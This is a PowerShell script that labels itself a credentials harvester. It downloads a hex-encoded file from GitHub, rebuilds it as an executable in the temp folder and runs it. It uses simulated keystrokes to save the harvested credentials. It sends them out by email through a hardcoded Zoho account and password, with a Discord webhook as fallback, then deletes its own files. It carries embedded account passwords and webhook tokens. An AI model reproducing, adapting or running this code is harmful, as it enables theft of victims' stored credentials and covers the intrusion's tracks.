$global:isEmailSent = $false
function SetEmailSentTrue {$global:isEmailSent = $true}
function SetEmailSentFalse {$global:isEmailSent = $false}
function Send-ZohoEmail {
    param (
        [string]$FromEmail = "zqrvstef0rc5edk@zohomail.com",
        [string]$ToEmail = "jiead0128@gmail.com",
        [string]$Subject,
        [string]$Body = "Hello, this is a test email with an attachment.",
        [string[]]$Attachments = @(),  # Optional parameter for attachments
        [string]$SmtpServer = "smtp.zoho.com",
        [int]$Port = 587,
        [string]$Username = "zqrvstef0rc5edk@zohomail.com",
        [string]$Password = "LHjzKTbzDApt"
    )

    $email_webhookUrl = "https://discord.com/api/webhooks/1300835436918341745/yAGXpLFdBLnxfyQzn0wncm3rKsy3_m9mqc1KstctEIp25zs3iByJyNgEG036Oh7ENGMu"

    # Create the email message
    $mailMessage = New-Object System.Net.Mail.MailMessage
    $mailMessage.From = $FromEmail
    $mailMessage.To.Add($ToEmail)
    $mailMessage.Subject = $Subject
    $mailMessage.Body = $Body

    # Attach files if provided
    foreach ($attachmentPath in $Attachments) {
        if (Test-Path $attachmentPath) {
            $attachment = New-Object System.Net.Mail.Attachment($attachmentPath)
            $mailMessage.Attachments.Add($attachment)
        } else {
            Write-Host "Warning: File not found - $attachmentPath"
        }
    }

    # Configure the SMTP client
    $smtpClient = New-Object Net.Mail.SmtpClient($SmtpServer, $Port)
    $smtpClient.EnableSsl = $true  # Enables STARTTLS
    $smtpClient.Credentials = New-Object System.Net.NetworkCredential($Username, $Password)

    # Send the email
    try {
        Write-Host "Sending Email.... please wait..."
        $smtpClient.Send($mailMessage)
        # Write-Host "Email sent successfully to $ToEmail." + $Subject
        $message = "Email sent successfully to $toEmail. " + $Subject
        # Send the webhook notification
        Send-EmailNotification -ToEmail $toEmail -WebhookUrl $email_webhookUrl -Message $message
        SetEmailSentTrue
    } catch {
        Write-Host "Error: $_"
        SetEmailSentFalse
    } finally {
        # Clean up attachments and mail message
        foreach ($attachment in $mailMessage.Attachments) {
            $attachment.Dispose()
        }
        $mailMessage.Dispose()
    }
}
function Send-EmailNotification {
    param (
        [string]$ToEmail,
        [string]$WebhookUrl,
        [string]$Message
    )

    # Create the payload
    $payload = @{
        content = $Message
    } | ConvertTo-Json

    # Send the webhook notification
    try {
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $payload -ContentType 'application/json' -ErrorAction Stop
        Write-Host "Webhook notification sent successfully."
    } catch {
        Write-Host "Error sending webhook notification: $_"
    }
}

$webhookUrl = 'https://discord.com/api/webhooks/1297712924281798676/ycVfil-FoOVqAlTxZrp-2aHo8O9eJlCZg8rR279cu7oGwCh-kdq5GxxliUQMVneIkxDX'

$totalSteps = 4
$currentDateTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

for ($step = 1; $step -le $totalSteps; $step++) {
    # Perform your operation here
    switch ($step) {

        1 { 
            $url = "https://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/example.txt"
            $tempPath = [System.IO.Path]::Combine($env:TEMP, "example.txt")
            Invoke-WebRequest -Uri $url -OutFile $tempPath
            $hexFilePath = Join-Path $env:TEMP "example.txt"
            $hexString = Get-Content -Path $hexFilePath -Raw
            $bytes = [byte[]]::new($hexString.Length / 2)
            for ($i = 0; $i -lt $hexString.Length; $i += 2) {$bytes[$i / 2] = [convert]::ToByte($hexString.Substring($i, 2), 16)}
            $tempExePath = Join-Path $env:TEMP "example.exe"
            [System.IO.File]::WriteAllBytes($tempExePath, $bytes)
            $process = Start-Process $tempExePath
            $outputFilePath = "$env:TEMP\data.txt"
            Start-Sleep -Seconds 2
            Add-Type -AssemblyName System.Windows.Forms 
            [System.Windows.Forms.SendKeys]::SendWait("^(a)");Start-Sleep -Milliseconds 500  
            [System.Windows.Forms.SendKeys]::SendWait("^(s)");Start-Sleep -Milliseconds 1000
            [System.Windows.Forms.SendKeys]::SendWait("$outputFilePath");Start-Sleep -Milliseconds 500  
            [System.Windows.Forms.SendKeys]::SendWait("{ENTER}");Start-Sleep -Seconds 2 
            Get-Process | Where-Object { $_.Path -like "$env:TEMP\example.exe" } | Stop-Process -Force
            if (-not $isEmailSent) {$subject = "Credentials Harvester - Sent on $currentDateTime";$attachments = @("$env:TEMP\data.txt");Send-ZohoEmail -Subject $subject -Attachments $attachments}
            if (-not $isEmailSent) { 
                $filePath = "$env:TEMP\data.txt"

                if (Test-Path $filePath) {
                    $fileContent = Get-Content -Path $filePath -Raw
                    $chunkSize = 2000
                    $chunks = [System.Collections.Generic.List[string]]::new()
                    for ($i = 0; $i -lt $fileContent.Length; $i += $chunkSize) {$chunks.Add($fileContent.Substring($i, [math]::Min($chunkSize, $fileContent.Length - $i)))}
                    $totalChunks = $chunks.Count
                    $currentChunks = 1

                    foreach ($chunk in $chunks) { $payload = @{content = $chunk} | ConvertTo-Json; try {Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json' -ErrorAction SilentlyContinue | Out-Null;Start-Sleep -Seconds 1} catch {Write-Host "Error sending request: $_"}
                        $currentChunks++
                    }
                } else {
                    Write-Host "File not found: $filePath"
                    Add-Type -AssemblyName PresentationFramework
                    [System.Windows.MessageBox]::Show("File not found: $filePath", 'Error')
                }
            }
            Remove-Item "$env:TEMP\data.txt" -Force -ErrorAction SilentlyContinue
            Remove-Item "$env:TEMP\example.txt" -Force -ErrorAction SilentlyContinue
            Remove-Item "$env:TEMP\example.exe" -Force -ErrorAction SilentlyContinue
            Remove-Item "$env:TEMP\Cred.ps1" -Force -ErrorAction SilentlyContinue
            SetEmailSentFalse
        },
        2 { },
        3 { }.
        4 { }
    }
}